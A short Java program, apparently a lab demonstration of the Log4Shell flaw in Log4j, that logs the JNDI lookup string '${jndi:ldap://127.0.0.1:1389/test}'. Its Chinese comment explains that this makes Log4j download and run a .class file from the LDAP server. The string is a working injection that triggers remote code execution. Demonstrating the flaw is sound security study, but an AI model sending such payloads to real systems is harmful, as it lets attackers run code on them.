import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


public class Log4J {
    private static final Logger logger = LogManager.getLogger(Log4J.class);

    public static void main(String[] args) {
        logger.error("${jndi:ldap://127.0.0.1:1389/test}");
        // Log4j漏洞会去下载该服务器上对应的.class文件并且执行该文件的
    }

}
